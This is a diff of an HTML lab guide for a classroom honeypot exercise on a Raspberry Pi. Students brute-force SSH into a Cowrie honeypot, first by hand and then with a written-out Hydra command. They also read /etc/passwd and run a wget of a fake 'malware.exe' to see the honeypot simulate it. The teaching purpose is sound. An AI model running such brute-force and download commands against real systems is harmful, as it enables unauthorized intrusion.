@@ -1,14 +1,29 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Cowrie Honeypot Guide</title>
-<style>body { font-family: Arial, sans-serif; background-color: #f4f4f9; padding: 40px; line-height: 1.6; } .container { background-color: white; padding: 30px; border-radius: 8px; max-width: 800px; margin: auto; box-shadow: 0 4px 8px rgba(0,0,0,0.1); } h1 { color: #333; font-size: 2.2em; } h2 { color: #007BFF; margin-top: 25px; border-bottom: 2px solid #eee; padding-bottom: 5px; } code { background: #1e1e1e; padding: 6px 10px; border-radius: 4px; font-size: 1.1em; color: #00ff00; display: inline-block; font-family: monospace; } .terminal-box { background-color: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 5px; font-family: monospace; margin: 15px 0; } ul, ol { font-size: 1.1em; margin-bottom: 20px; } li { margin-bottom: 10px; }</style>
-</head><body><div class="container">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cowrie Honeypot Guide</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f9; padding: 40px; line-height: 1.6; } 
+        .container { background-color: white; padding: 30px; border-radius: 8px; max-width: 800px; margin: auto; box-shadow: 0 4px 8px rgba(0,0,0,0.1); } 
+        h1 { color: #333; font-size: 2.2em; } 
+        h2 { color: #007BFF; margin-top: 25px; border-bottom: 2px solid #eee; padding-bottom: 5px; } 
+        code { background: #1e1e1e; padding: 6px 10px; border-radius: 4px; font-size: 1.1em; color: #00ff00; display: inline-block; font-family: monospace; } 
+        .terminal-box { background-color: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 5px; font-family: monospace; margin: 15px 0; } 
+        ul, ol { font-size: 1.1em; margin-bottom: 20px; } 
+        li { margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+<div class="container">
     <h1>🍯 Cowrie Honeypot: The Trap</h1>
     <p><strong>WARNING: This is not a web application.</strong> To play this challenge, you need to open the <strong>Terminal</strong> application on your Raspberry Pi desktop (the black box icon at the top of the screen).</p>
     
     <h2>🧠 The Concept</h2>
     <p>A honeypot is an "Active Defense" trap. Instead of trying to keep hackers out, cybersecurity engineers set up fake, highly vulnerable servers specifically designed to lure them in.</p>
-    <p>When a hacker attacks a honeypot, they think they have successfully breached a real company. In reality, they are trapped in a fake, simulated computer system, and the security engineers are recording every single command they type to study their tactics.</p>
+    <p>When a hacker attacks a honeypot, they think they have successfully breached a real company. In reality, they are trapped in a fake, simulated computer system. The honeypot acts exactly like a real server, responding to commands and simulating a realistic environment. This tricks the attacker into wasting their time and revealing their tools, all while keeping the actual network completely safe.</p>
     
-    <h2>🎯 Mission 1: Break In</h2>
+    <h2>🚪 Mission 1: Break In (Manual)</h2>
     <p>Your first goal is to force your way into the server using a protocol called SSH (Secure Shell). Because this server is a trap, the administrators intentionally left a terrible password on the root (admin) account.</p>
     <ol>
         <li>Open your Terminal.</li>
@@ -17,8 +32,18 @@
         <li>When it asks for a password, try guessing awful, common passwords. <em>(Hint: Try <code>123456</code>, <code>admin</code>, or <code>password</code>)</em>. Note: When typing passwords in Linux, the cursor will not move. Just type it and hit Enter!</li>
     </ol>
 
-    <h2>🎯 Mission 2: Explore the System</h2>
-    <p>If you guessed the password correctly, your terminal prompt will change to <code>root@server:~#</code>. You are now "inside" the honeypot!</p>
+    <h2>⚔️ Mission 2: Automate the Attack (Hydra)</h2>
+    <p>Real hackers do not sit there guessing passwords one by one. They use automated tools to try hundreds of passwords a second. You have a tool called <strong>Hydra</strong> installed on your system to do exactly this.</p>
+    <ol>
+        <li>First, open a new Terminal tab and create a small "dictionary" of passwords. Type this command to create a file called <code>words.txt</code>:<br>
+        <div class="terminal-box">printf "qwerty\nadmin\npassword\n123456\n" > words.txt</div></li>
+        <li>Now, unleash Hydra against your target! Replace the IP and Port below with the ones from your dashboard:<br>
+        <div class="terminal-box">hydra -l root -P words.txt ssh://192.168.2.10 -s 2221</div></li>
+        <li>Watch the terminal as Hydra rapidly tests every password in your list against the server until it finds the correct one!</li>
+    </ol>
+
+    <h2>🔍 Mission 3: Explore the System</h2>
+    <p>Once you have the password, log in via SSH (like you did in Mission 1). Your terminal prompt will change to <code>root@server:~#</code>. You are now "inside" the honeypot!</p>
     <p>Because there is no mouse or graphical menu, you have to navigate the computer using text commands. Try typing these real Linux commands into the terminal to see what you can find:</p>
     
     <div class="terminal-box">
@@ -35,10 +60,12 @@
         <em>(Concatenate: This forces the server to print out the master list of all user accounts registered to the machine.)</em>
     </div>
 
-    <h2>🎯 Mission 3: The Download</h2>
-    <p>Hackers often try to download malicious files once they break into a server. Try downloading a fake file from the internet using the `wget` command:</p>
+    <h2>📥 Mission 4: The Download</h2>
+    <p>Hackers often try to download malicious files once they break into a server. Try downloading a fake file from the internet using the <code>wget</code> command:</p>
     <div class="terminal-box">
         <strong>wget http://google.com/malware.exe</strong><br>
-        <em>(Notice how the honeypot pretends to download the file, even though it isn't connected to the real internet!)</em>
+        <em>(Notice how the honeypot pretends to download the file, perfectly simulating an internet connection even though it isn't connected to the real web!)</em>
     </div>
-</div></body></html>
+</div>
+</body>
+</html>
